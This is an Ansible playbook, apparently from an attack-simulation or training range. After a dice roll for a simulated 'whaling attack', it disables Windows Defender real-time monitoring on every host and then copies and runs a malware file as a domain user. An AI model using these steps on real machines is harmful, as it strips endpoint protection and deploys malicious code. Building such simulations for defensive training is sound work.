---
- name: Check Realtime Monitoring
  hosts: all
  vars:
    ansible_password: "{{ passwd_pfx + adm_passwd }}"
    ansible_user: "{{ adm_name }}"

  tasks:

  - name: Check if User is admin
    win_command: whoami /groups
    become: yes
    become_method: runas
    become_user: "{{ usr_name }}@{{ domain_name }}"
    vars:
      ansible_become_pass: "{{ passwd_pfx + usr_passwd }}"
    register: results

  - name: Whaling attack
    block:
    - set_fact:
        r: "{{  21 | random(start=1) }}"
      run_once: yes

    - name: Print 20 sided Die Result
      ansible.builtin.debug:
        var: r

    - name: "End play if admin"
      debug:
        msg: "{{ usr_name }} is an admin user"

    - name: Ending play
      ansible.builtin.meta: end_play
      when: r != '20'

    - name: Whaling Attack Success
      debug:
        msg: "You're gonna need a bigger boat"
    when: (results.stdout is search("Admin"))

  - name: Disable realtime monitoring
    ansible.windows.win_powershell:
      script: |
        Set-MpPreference -DisableRealtimeMonitoring $true

  - name: Checking Defender Settings
    ansible.windows.win_powershell:
      script: |
        $Preferences = Get-MpPreference
        $Preferences.DisableRealtimeMonitoring
    register: host_out

  - name: Copies the Malware
    ansible.windows.win_copy:
      src: "{{ directory + malware_name }}"
      dest: C:\{{ malware_name }}
      force: yes

#  - name: Check Mark of The Web
#    ansible.windows.win_powershell:
#      script: |
#        Get-Content C:\{{ malware_name }} -Stream Zone.Identifier
#    register: pwsh_output

#  - debug:
#     var: pwsh_output

  - name: Run The Malware
    ansible.windows.win_command: "{{ malware_name }}"
    become: yes
    become_method: runas
    become_user: "{{ usr_name }}@{{ domain_name }}"
#    become_flags: logon_type=batch
    vars:
      ansible_become_pass: "{{ passwd_pfx + usr_passwd }}"
    args:
      chdir: C:\
    async: 10
    poll: 0
    register: command_output

  - debug:
      var: command_output
